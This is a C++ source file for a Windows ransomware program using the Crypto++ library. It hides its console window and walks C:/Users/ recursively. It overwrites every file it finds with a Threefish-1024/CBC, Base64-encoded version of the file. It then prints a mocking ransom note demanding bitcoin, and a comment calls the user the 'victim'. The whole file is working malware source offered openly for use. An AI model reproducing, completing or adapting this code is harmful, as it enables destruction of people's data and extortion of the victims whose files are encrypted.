// main.cpp

// all crypto++ lab files are in this project. you can use any encryption .h file and simply change variable names and build it with your new encryption
// in this code, i will be using threeFish

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <cstdlib>
#include "Crypto++/aes.h"  
#include "Crypto++/modes.h"
#include "Crypto++/filters.h"
#include "Crypto++/base64.h"
#include "Crypto++/threefish.h"
#include "directoryreader.h"

using namespace CryptoPP;

void HideConsole();
void ShowConsole();
bool IsConsoleVisible();

int main(int argc, char **argv)
{
	HideConsole();

	CryptoPP::byte key[CryptoPP::Threefish1024::MAX_KEYLENGTH];
	CryptoPP::byte iv[CryptoPP::Threefish1024::BLOCKSIZE];

	
	if (argc > 1)
		DirectoryReader::parseDirectory(argv[1], 0); // Program will accept arguments where to start parsing


	DirectoryReader::parseDirectory("C:/Users/", 0); // Starting directory to parse, simply change where you want it to start

	std::fstream inFile;
	for (int i = 0; i < files.size(); i++)
	{
		std::string temp = files[i];
		inFile.open(temp.c_str(), std::ios::out | std::ios::app | std::ios::binary | std::ios::in);
		std::string plainTxt((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
		inFile.close();
		std::string cipherTxt;
		CryptoPP::Threefish1024::Encryption aesEncryption(key, CryptoPP::Threefish1024::MAX_KEYLENGTH);
		CryptoPP::CBC_Mode_ExternalCipher::Encryption cbcEncryption(aesEncryption, iv);
		CryptoPP::StreamTransformationFilter stfEncryptor(cbcEncryption, new CryptoPP::Base64Encoder(new CryptoPP::StringSink(cipherTxt))); // encrypts in base64 and threefish
		stfEncryptor.Put(reinterpret_cast<const unsigned char*>(plainTxt.c_str()), plainTxt.length());
		stfEncryptor.MessageEnd();
		inFile.open(temp, std::ofstream::out | std::ofstream::binary);
		inFile << cipherTxt;
	}

	ShowConsole();

	// just some random console output to let victim know they got screwed
	std::cout << "GOOD JOB ON NOT HAVING 480 COMPUTER SKILLS TO AVOID THIS." << std::endl;
	std::cout << "IF YOU AREN'T ELON, GO DROWN YOURSELF IN ANIME NEKO GIRLS FOR YOU CHANCE TO BE HIM" << std::endl;
	std::cout << "SEND 50 MILLLLLI BITCOINS TO MY BITCOIN ADRESS: somerandomaddress" << std::endl;
	std::cout << "Goodbye." << std::endl;
	system("PAUSE");
	return 0;
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void ShowConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_SHOW);
}

bool IsConsoleVisible()
{
	return ::IsWindowVisible(::GetConsoleWindow()) != FALSE;
}